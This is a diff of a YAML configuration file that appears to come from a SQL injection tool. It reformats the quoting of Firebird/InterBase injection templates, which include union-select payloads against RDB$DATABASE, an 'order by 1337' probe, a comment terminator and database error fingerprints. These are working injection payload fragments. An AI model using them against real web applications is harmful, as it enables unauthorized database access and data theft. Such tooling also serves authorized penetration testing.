@@ -1,4 +1,4 @@
-vendor: ""
+vendor: 
 resource: 
  info: |
   SELECT 
@@ -50,7 +50,7 @@ resource:
     from ${TABLE}
     {limit}
    fields: 
-    field: "trim(coalesce(${FIELD}, ''))"
+    field: trim(coalesce(${FIELD}, ''))
     concat: "|| '%7f' ||"
     
 strategy: 
@@ -70,8 +70,8 @@ strategy:
            '${TRAIL_SQL}'
        )
        from RDB$DATABASE
-  limit: "ROWS ${LIMIT} TO ${LIMIT}"
-  failsafe: "(1337${INDICE}7330%2b1)"
+  limit: ROWS ${LIMIT} TO ${LIMIT}
+  failsafe: (1337${INDICE}7330%2b1)
   calibrator: |
    rpad(
        '${CALIBRATOR_SQL}', 
@@ -79,14 +79,14 @@ strategy:
        '${CALIBRATOR_SQL}'
    )
   limitBoundary: 1
-  endingComment: "--+-"
+  endingComment: --+-
   fingerprint: 
    errorMessage: 
-    - "Warning: ibase_query()"
-    - "function.ibase-query"
-    - "Unexpected end of command - line"
+    - 'Warning: ibase_query()'
+    - function.ibase-query
+    - Unexpected end of command - line
     
  normal: 
-  indices: "union select ${INDICES} from RDB$DATABASE"
-  capacity: "(select '${LEAD}${INDICE}' || ${CALIBRATOR} from RDB\\$DATABASE)"
-  orderBy: "order by 1337"
+  indices: union select ${INDICES} from RDB$DATABASE
+  capacity: (select '${LEAD}${INDICE}' || ${CALIBRATOR} from RDB\$DATABASE)
+  orderBy: order by 1337
